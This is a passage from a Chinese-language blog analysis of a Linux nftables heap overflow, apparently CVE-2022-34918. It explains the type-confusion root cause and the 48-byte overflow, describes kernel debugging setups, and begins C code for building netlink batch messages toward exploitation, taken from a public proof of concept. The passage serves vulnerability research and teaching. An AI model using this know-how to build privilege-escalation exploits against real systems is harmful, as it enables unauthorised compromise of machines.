</span></span><span style=display:flex><span>                        <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nft_set_ext_tmpl <span style=color:#666>*</span>tmpl,
</span></span><span style=display:flex><span>                        <span style=color:#007020;font-weight:700>const</span> u32 <span style=color:#666>*</span>key, <span style=color:#007020;font-weight:700>const</span> u32 <span style=color:#666>*</span>key_end,
</span></span><span style=display:flex><span>                        <span style=color:#007020;font-weight:700>const</span> u32 <span style=color:#666>*</span>data, u64 timeout, u64 expiration, <span style=color:#902000>gfp_t</span> gfp)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nft_set_ext <span style=color:#666>*</span>ext;
</span></span><span style=display:flex><span>  <span style=color:#902000>void</span> <span style=color:#666>*</span>elem;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  elem <span style=color:#666>=</span> <span style=color:#06287e>kzalloc</span>(set<span style=color:#666>-&gt;</span>ops<span style=color:#666>-&gt;</span>elemsize <span style=color:#666>+</span> tmpl<span style=color:#666>-&gt;</span>len, gfp);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (elem <span style=color:#666>==</span> <span style=color:#007020>NULL</span>)
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> <span style=color:#007020>NULL</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  ext <span style=color:#666>=</span> <span style=color:#06287e>nft_set_elem_ext</span>(set, elem);
</span></span><span style=display:flex><span>  <span style=color:#06287e>nft_set_ext_init</span>(ext, tmpl);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>memcpy</span>(<span style=color:#06287e>nft_set_ext_key</span>(ext), key, set<span style=color:#666>-&gt;</span>klen);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>nft_set_ext_exists</span>(ext, NFT_SET_EXT_KEY_END))
</span></span><span style=display:flex><span>    <span style=color:#06287e>memcpy</span>(<span style=color:#06287e>nft_set_ext_key_end</span>(ext), key_end, set<span style=color:#666>-&gt;</span>klen);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>nft_set_ext_exists</span>(ext, NFT_SET_EXT_DATA))
</span></span><span style=display:flex><span>    <span style=color:#06287e>memcpy</span>(<span style=color:#06287e>nft_set_ext_data</span>(ext), data, set<span style=color:#666>-&gt;</span>dlen);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>nft_set_ext_exists</span>(ext, NFT_SET_EXT_EXPIRATION)) {
</span></span><span style=display:flex><span>    <span style=color:#666>*</span><span style=color:#06287e>nft_set_ext_expiration</span>(ext) <span style=color:#666>=</span> <span style=color:#06287e>get_jiffies_64</span>() <span style=color:#666>+</span> expiration;
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (expiration <span style=color:#666>==</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>      <span style=color:#666>*</span><span style=color:#06287e>nft_set_ext_expiration</span>(ext) <span style=color:#666>+=</span> timeout;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>nft_set_ext_exists</span>(ext, NFT_SET_EXT_TIMEOUT))
</span></span><span style=display:flex><span>    <span style=color:#666>*</span><span style=color:#06287e>nft_set_ext_timeout</span>(ext) <span style=color:#666>=</span> timeout;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> elem;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div>private data 使用 <code>kzalloc</code> 分配，将使用 <code>GFP_KERNEL</code> flag ，同时其 size 是由 <code>nft_set_ext_tmpl tmpl</code> 这个变量共同决定的。
这里注意，在拷贝 <code>NFT_SET_EXT_DATA</code> 属性时，是这么做的<div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>nft_set_ext_exists</span>(ext, NFT_SET_EXT_DATA))
</span></span><span style=display:flex><span>  <span style=color:#06287e>memcpy</span>(<span style=color:#06287e>nft_set_ext_data</span>(ext), data, set<span style=color:#666>-&gt;</span>dlen);
</span></span></code></pre></div>使用的是 <code>set->dlen</code> 字段，这个也合理，毕竟一个 set 中的每个元素大小都是已知的。但是由于漏洞的存在，我们可以让一个 VERDICT 类型的元素进入 set 中，VERDICT 元素的 len 将会是<div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// in nft_verdict_init
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>desc<span style=color:#666>-&gt;</span>len <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>sizeof</span>(data<span style=color:#666>-&gt;</span>verdict);
</span></span><span style=display:flex><span>desc<span style=color:#666>-&gt;</span>type <span style=color:#666>=</span> NFT_DATA_VERDICT;
</span></span></code></pre></div>长度为 16 。而 set 的元素类型可以为任何类型，大小最大允许到 64byte ，即我们可以实现 <code>set->dlen = 64</code> && <code>desc->len = 16</code> ，这样在 memcpy 是就可以实现最大 64 - 16 = 48 字节的堆溢出了。</li></ol><p>总结一下：set 中可以存储多个元素，但是每个元素类型必须相同。漏洞出现在 <code>nft_setelem_parse_data</code> 中，这里对元素的类型出现了疏漏：</p><p>如果 desc->type 是 <code>NFT_DATA_VERDICT</code> 类型，且 set 中原来存储的是 <code>NFT_DATA_VALUE</code> 类型，那么这里由于 <code>desc->type != NFT_DATA_VERDICT</code> 不成立，所以检查直接通过，就会把一个 <code>NFT_DATA_VERDICT</code> 类型的元素添加到 <code>NFT_DATA_VALUE</code> 中。当 <code>NFT_DATA_VERDICT</code> 类型的元素大小小于 <code>NFT_DATA_VALUE</code> 时，当前的实现会导致堆溢出。</p><h2 id=漏洞利用><span class=section-num>5</span> 漏洞利用</h2><h3 id=调试方法><span class=section-num>5.1</span> 调试方法</h3><h4 id=vmware-remote-debugging-stub><span class=section-num>5.1.1</span> VMware Remote Debugging Stub</h4><p>刚开始时我想使用 VMware 进行调试，这样我可以装个 nft ，不过由于我使用 wsl2 必须开启 hyper-v ，而 VMware 当前（VMware 16）对 hyper-V 的调试支持并不稳定——下断点就 crash 。所以我并不配用，但是既然我研究过了如何使用 vmware 进行 debug ，这里还是记录一下（至少 gdb 还是可以 attach 上去的）</p><p>在 VMware 虚拟机的 *.vmx 文件中添加</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>debugStub.listen.guest64 = &#34;TRUE&#34;
</span></span><span style=display:flex><span>debugStub.listen.guest64.remote = &#34;TRUE&#34;
</span></span></code></pre></div><p>然后就可以 gdb attach 到 8864 端口上了。如果要调试的是 32 位虚拟机，那么就是把 guest64 替换成 guest32 ，端口会变成 8832 。由于我需要使用 wsl 中的 gdb 进行调试，所以才需要 .remote 的那一行来允许远程调试。调试时指定 host 机的 ip 地址即可 attach ，这里要注意，虽然 wsl 和 windows 之间会互相端口转发，VMware 却并不会（搞不懂 wsl 的这个网络规则），所以还是要 ifconfig 找一下。由于 wsl 是处于一个 host 创建的隔离的 LAN 中的，所以 host ip 和他的网关的 ip 地址相同</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>eth0: <span style=color:#bb60d5>flags</span><span style=color:#666>=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span style=color:#40a070>1500</span>
</span></span><span style=display:flex><span>        inet 172.18.81.154  netmask 255.255.240.0  broadcast 172.18.95.255
</span></span></code></pre></div><p>比如说我 ifconfig 出来结果是这样的，那么网关就是 172.18.80.1 了。所以使用 <code>target remote 172.18.80.1:8864</code> 。</p><h4 id=qemu-kvm><span class=section-num>5.1.2</span> qemu-kvm</h4><p>在 wsl 里面使用 qemu-kvm 只能说能用，但是性能损失许多，所以我也放弃了。</p><h4 id=debootstrap><span class=section-num>5.1.3</span> debootstrap</h4><p>我想要的只是拥有一个正常一点的 rootfs ——有个 nft 就行。另一方面，使用过去一直使用的 buzybox rootfs 时，我发现我无法向 netlink 发包，会返回 errno 11 ，不知道是什么原因。所以我就找到了 debootstrap 这个伟大的工具。不过我不选择直接使用他来生成 rootfs ，而是使用 syzkaller <a href=https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md#create-debian-stretch-linux-image>提供的工具</a>来生成，摘录原文：</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>mkdir <span style=color:#bb60d5>$IMAGE</span>
</span></span><span style=display:flex><span><span style=color:#007020>cd</span> <span style=color:#bb60d5>$IMAGE</span>/
</span></span><span style=display:flex><span>wget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh
</span></span><span style=display:flex><span>chmod +x create-image.sh
</span></span><span style=display:flex><span>./create-image.sh
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># The result should be $IMAGE/stretch.img disk image.</span>
</span></span></code></pre></div><p>不过这样生成的是一个 ext4 格式的磁盘镜像，所以启动 qemu 的时候也要修改相应参数，即在 <code>-append</code> 字符串中添加 <code>"root=/dev/sda"</code> 一段，然后指定 drive ，以下是一个示例</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>-append <span style=color:#4070a0>&#34;console=ttyS0 root=/dev/sda&#34;</span>
</span></span><span style=display:flex><span>-drive <span style=color:#bb60d5>file</span><span style=color:#666>=</span>./stretch.img,format<span style=color:#666>=</span>raw
</span></span></code></pre></div><h3 id=交互过程><span class=section-num>5.2</span> 交互过程</h3><p>nftables 的交互和一般的内核子系统不同。不再是简单的系统调用或者 <code>xxctl</code> ，而是需要使用 netlink socket 收发信息。这个我并不熟悉，所以这里写的详细一些。我是结合源码的同时抄了<a href=https://github.com/randorisec/CVE-2022-34918-LPE-PoC>这里</a>的代码学习的。</p><p>在 netlink 中，我们可以使用<a href=https://stackoverflow.com/questions/4258834/how-sendmsg-works> <code>sendmsg</code></a> 这个函数来发送 batch 请求，所谓的 batch 请求就是 netlink 可以一次接受多个请求然后一并处理（批处理）。我们要做的几个操作， <code>NFT_MSG_NEWTABLE</code> <code>NFT_MSG_NEWSET</code> 和 <code>NFT_MSG_NEWSETELEM</code> 三个方法都是批处理方法（call_batch）。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nfnl_callback nf_tables_cb[NFT_MSG_MAX] <span style=color:#666>=</span> {
</span></span><span style=display:flex><span>  [NFT_MSG_NEWTABLE] <span style=color:#666>=</span> {
</span></span><span style=display:flex><span>    .call_batch	<span style=color:#666>=</span> nf_tables_newtable,
</span></span><span style=display:flex><span>    .attr_count	<span style=color:#666>=</span> NFTA_TABLE_MAX,
</span></span><span style=display:flex><span>    .policy		<span style=color:#666>=</span> nft_table_policy,
</span></span><span style=display:flex><span>  },
</span></span><span style=display:flex><span>  [NFT_MSG_NEWSET] <span style=color:#666>=</span> {
</span></span><span style=display:flex><span>    .call_batch	<span style=color:#666>=</span> nf_tables_newset,
</span></span><span style=display:flex><span>    .attr_count	<span style=color:#666>=</span> NFTA_SET_MAX,
</span></span><span style=display:flex><span>    .policy		<span style=color:#666>=</span> nft_set_policy,
</span></span><span style=display:flex><span>  },
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// ...
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  [NFT_MSG_NEWSETELEM] <span style=color:#666>=</span> {
</span></span><span style=display:flex><span>    .call_batch	<span style=color:#666>=</span> nf_tables_newsetelem,
</span></span><span style=display:flex><span>    .attr_count	<span style=color:#666>=</span> NFTA_SET_ELEM_LIST_MAX,
</span></span><span style=display:flex><span>    .policy		<span style=color:#666>=</span> nft_set_elem_list_policy,
</span></span><span style=display:flex><span>  },
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// ...
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>}
</span></span></code></pre></div><p>使用该函数需要构造一个 <code>msghdr</code> 结构体来存储数据，然后把要发送的数据存储在 <code>iovec</code> 中。其中第一个元素放 <code>NFNL_MSG_BATCH_BEGIN</code> 消息，用以通知批处理开始，最后一个放 <code>NFNL_MSG_BATCH_END</code> 消息，用以通知结束。中间就可以加上一些批处理请求了。结构体定义如下</p><p><a id="code-snippet--struct msghdr"></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/* Structure describing messages sent by
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>   `sendmsg&#39; and received by `recvmsg&#39;.  */</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> msghdr
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#902000>void</span> <span style=color:#666>*</span>msg_name;		<span style=color:#60a0b0;font-style:italic>/* Address to send to/receive from.  */</span>
</span></span><span style=display:flex><span>  <span style=color:#902000>socklen_t</span> msg_namelen;	<span style=color:#60a0b0;font-style:italic>/* Length of address data.  */</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> iovec <span style=color:#666>*</span>msg_iov;	<span style=color:#60a0b0;font-style:italic>/* Vector of data to send/receive into.  */</span>
</span></span><span style=display:flex><span>  <span style=color:#902000>size_t</span> msg_iovlen;		<span style=color:#60a0b0;font-style:italic>/* Number of elements in the vector.  */</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#902000>void</span> <span style=color:#666>*</span>msg_control;		<span style=color:#60a0b0;font-style:italic>/* Ancillary data (eg BSD filedesc passing). */</span>
</span></span><span style=display:flex><span>  <span style=color:#902000>size_t</span> msg_controllen;	<span style=color:#60a0b0;font-style:italic>/* Ancillary data buffer length.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>                                   !! The type should be socklen_t but the
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>                                   definition of the kernel is incompatible
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>                                   with this.  */</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> msg_flags;		<span style=color:#60a0b0;font-style:italic>/* Flags on received message.  */</span>
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><ul><li><code>msg_name</code> ：指定发送的目标地址
我们的 socket 是 netlink ，目标地址存储在 <code>sockaddr_nl</code> 中即可，需要设置其 <code>nl_family</code> 字段为 <code>AF_NETLINK</code> ，其余设为 0<div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> sockaddr_nl dest_nl;
</span></span><span style=display:flex><span><span style=color:#06287e>memset</span>(<span style=color:#666>&amp;</span>dest_nl, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(dest_nl));
</span></span><span style=display:flex><span>dest_nl.nl_family <span style=color:#666>=</span> AF_NETLINK;
</span></span></code></pre></div></li><li><code>msg_namelen</code> ：指定 <code>msg_name</code> 长度，设置为 <code>sizeof(struct sockaddr_nl)</code></li><li><code>msg_iov</code> ：就是上面说的 iovec</li></ul><p>其余字段留空。</p><p>iovec 中存储的就是 netlink msg ，可以用于操作 netfilter 子系统，这种消息的消息头用 <code>nlmsghdr</code> 来表示。</p><p><a id="code-snippet--struct nlmsghdr"></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> nlmsghdr {
</span></span><span style=display:flex><span>        __u32		nlmsg_len;	<span style=color:#60a0b0;font-style:italic>/* Length of message including header */</span>
</span></span><span style=display:flex><span>        __u16		nlmsg_type;	<span style=color:#60a0b0;font-style:italic>/* Message content */</span>
</span></span><span style=display:flex><span>        __u16		nlmsg_flags;	<span style=color:#60a0b0;font-style:italic>/* Additional flags */</span>
</span></span><span style=display:flex><span>        __u32		nlmsg_seq;	<span style=color:#60a0b0;font-style:italic>/* Sequence number */</span>
</span></span><span style=display:flex><span>        __u32		nlmsg_pid;	<span style=color:#60a0b0;font-style:italic>/* Sending process port ID */</span>
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>这个头中我们主要要设置的是 <code>nlmsg_len</code> 和 <code>nlmsg_type</code></p><ul><li><code>nlmsg_len</code> 描述了整个消息的长度，这个长度其实就是数据 + nlmsghdr 头，然后算上对齐的长度。我们使用 <code>NLMSG_SPACE</code> 宏即可把数据长度转成 <code>nlmsg_len</code></li><li><code>nlmsg_type</code> 如果之前看 <a href=#%E7%94%A8%E6%88%B7%E6%80%81%E5%90%91%E5%86%85%E6%A0%B8%E8%AF%B7%E6%B1%82%E6%B5%81%E7%A8%8B>用户态向内核请求流程</a> 这里有注意到的话，就会知道 <code>subsys_id</code> 和 <code>res_id</code> 是一起存储在这个字段里的。高 16 位为 <code>subsys_id</code> ，低 16 位为 <code>res_id</code> 。</li></ul><p>然后在 <code>nlmsghdr</code> 后面，还需要存储一个 <code>nfgenmsg</code> 结构</p><p><a id="code-snippet--struct nfgenmsg"></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/* General form of address family dependent message.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> nfgenmsg {
</span></span><span style=display:flex><span>        __u8  nfgen_family;		<span style=color:#60a0b0;font-style:italic>/* AF_xxx */</span>
</span></span><span style=display:flex><span>        __u8  version;		<span style=color:#60a0b0;font-style:italic>/* nfnetlink version */</span>
</span></span><span style=display:flex><span>        __be16    res_id;		<span style=color:#60a0b0;font-style:italic>/* resource id */</span>
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>然后紧接着 <code>nfgenmsg</code> ，存储 <code>nlattr</code> ，之前详细分析过，这是用来存储请求的数据的。我们先来看怎么构建 <code>NFNL_MSG_BATCH_BEGIN</code> 和 <code>NFNL_MSG_BATCH_END</code> 消息，对于这两种消息，不需要 <code>nlattr</code></p><p><a id="code-snippet--make NFNL-MSG-BATCH-BEGIN"></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span><span style=color:#06287e>make_bacth_begin_nlmsghdr</span>() {
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh <span style=color:#666>=</span>
</span></span><span style=display:flex><span>      (<span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>)<span style=color:#06287e>malloc</span>(<span style=color:#06287e>NLMSG_SPACE</span>(<span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nfgenmsg)));
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nfgenmsg <span style=color:#666>*</span>nfgm <span style=color:#666>=</span> <span style=color:#06287e>NLMSG_DATA</span>(nlh);
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(nlh, <span style=color:#40a070>0</span>, <span style=color:#06287e>NLMSG_SPACE</span>(<span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nfgenmsg)));
</span></span><span style=display:flex><span>  nlh<span style=color:#666>-&gt;</span>nlmsg_flags <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>  nlh<span style=color:#666>-&gt;</span>nlmsg_seq <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>  nlh<span style=color:#666>-&gt;</span>nlmsg_len <span style=color:#666>=</span> <span style=color:#06287e>NLMSG_SPACE</span>(<span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nfgenmsg));
</span></span><span style=display:flex><span>  nlh<span style=color:#666>-&gt;</span>nlmsg_pid <span style=color:#666>=</span> <span style=color:#06287e>getpid</span>();
</span></span><span style=display:flex><span>  nlh<span style=color:#666>-&gt;</span>nlmsg_type <span style=color:#666>=</span> NFNL_MSG_BATCH_BEGIN;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  nfgm<span style=color:#666>-&gt;</span>res_id <span style=color:#666>=</span> NFNL_SUBSYS_NFTABLES;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> nlh;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><a id="code-snippet--make NFNL-MSG-BATCH-END"></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span><span style=color:#06287e>make_bacth_end_nlmsghdr</span>() {
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh <span style=color:#666>=</span>
</span></span><span style=display:flex><span>      (<span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>)<span style=color:#06287e>malloc</span>(<span style=color:#06287e>NLMSG_SPACE</span>(<span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nfgenmsg)));
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(nlh, <span style=color:#40a070>0</span>, <span style=color:#06287e>NLMSG_SPACE</span>(<span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nfgenmsg)));
</span></span><span style=display:flex><span>  nlh<span style=color:#666>-&gt;</span>nlmsg_flags <span style=color:#666>=</span> NLM_F_REQUEST;
</span></span><span style=display:flex><span>  nlh<span style=color:#666>-&gt;</span>nlmsg_seq <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>  nlh<span style=color:#666>-&gt;</span>nlmsg_len <span style=color:#666>=</span> <span style=color:#06287e>NLMSG_SPACE</span>(<span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nfgenmsg));
</span></span><span style=display:flex><span>  nlh<span style=color:#666>-&gt;</span>nlmsg_pid <span style=color:#666>=</span> <span style=color:#06287e>getpid</span>();
</span></span><span style=display:flex><span>  nlh<span style=color:#666>-&gt;</span>nlmsg_type <span style=color:#666>=</span> NFNL_MSG_BATCH_END;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> nlh;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>只要设置好每个字段即可。需要注意的是对于 <code>NFNL_MSG_BATCH_BEGIN</code> 请求，需要设置其 res_id 字段，在 <code>nfnetlink_rcv_skb_batch</code> 会用到</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// in nfnetlink_rcv_skb_batch
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#60a0b0;font-style:italic>/* Work around old nft using host byte order */</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>if</span> (nfgenmsg<span style=color:#666>-&gt;</span>res_id <span style=color:#666>==</span> NFNL_SUBSYS_NFTABLES)
</span></span><span style=display:flex><span>        res_id <span style=color:#666>=</span> NFNL_SUBSYS_NFTABLES;
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>else</span>
</span></span><span style=display:flex><span>        res_id <span style=color:#666>=</span> <span style=color:#06287e>ntohs</span>(nfgenmsg<span style=color:#666>-&gt;</span>res_id);
</span></span></code></pre></div><p>不然就无效了。</p><p>然后我们再来看如何设置 <code>nlattr</code> ，先抄几个 helper</p><p><a id="code-snippet--helper for nlattr"></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// Netlink attributes
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020>#define U32_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint32_t))
</span></span></span><span style=display:flex><span><span style=color:#007020>#define U64_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint64_t))
</span></span></span><span style=display:flex><span><span style=color:#007020>#define S8_NLA_SIZE (sizeof(struct nlattr) + 8)
</span></span></span><span style=display:flex><span><span style=color:#007020></span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/**
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * set_nested_attr(): Prepare a nested netlink attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @attr: Attribute to fill
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @type: Type of the nested attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @data_len: Length of the nested attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span><span style=color:#06287e>set_nested_attr</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>attr, <span style=color:#902000>uint16_t</span> type, <span style=color:#902000>uint16_t</span> data_len) {
</span></span><span style=display:flex><span>    attr<span style=color:#666>-&gt;</span>nla_type <span style=color:#666>=</span> type;
</span></span><span style=display:flex><span>    attr<span style=color:#666>-&gt;</span>nla_len <span style=color:#666>=</span> <span style=color:#06287e>NLA_ALIGN</span>(data_len <span style=color:#666>+</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr));
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> (<span style=color:#902000>void</span> <span style=color:#666>*</span>)attr <span style=color:#666>+</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/**
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * set_u32_attr(): Prepare an integer netlink attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @attr: Attribute to fill
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @type: Type of the attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @value: Value of this attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span><span style=color:#06287e>set_u32_attr</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>attr, <span style=color:#902000>uint16_t</span> type, <span style=color:#902000>uint32_t</span> value) {
</span></span><span style=display:flex><span>    attr<span style=color:#666>-&gt;</span>nla_type <span style=color:#666>=</span> type;
</span></span><span style=display:flex><span>    attr<span style=color:#666>-&gt;</span>nla_len <span style=color:#666>=</span> U32_NLA_SIZE;
</span></span><span style=display:flex><span>    <span style=color:#666>*</span>(<span style=color:#902000>uint32_t</span> <span style=color:#666>*</span>)<span style=color:#06287e>NLA_ATTR</span>(attr) <span style=color:#666>=</span> <span style=color:#06287e>htonl</span>(value);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> (<span style=color:#902000>void</span> <span style=color:#666>*</span>)attr <span style=color:#666>+</span> U32_NLA_SIZE;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> <span style=color:#60a0b0;font-style:italic>/**
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * set_u64_attr(): Prepare a 64 bits integer netlink attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @attr: Attribute to fill
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * @type: Type of the attribute
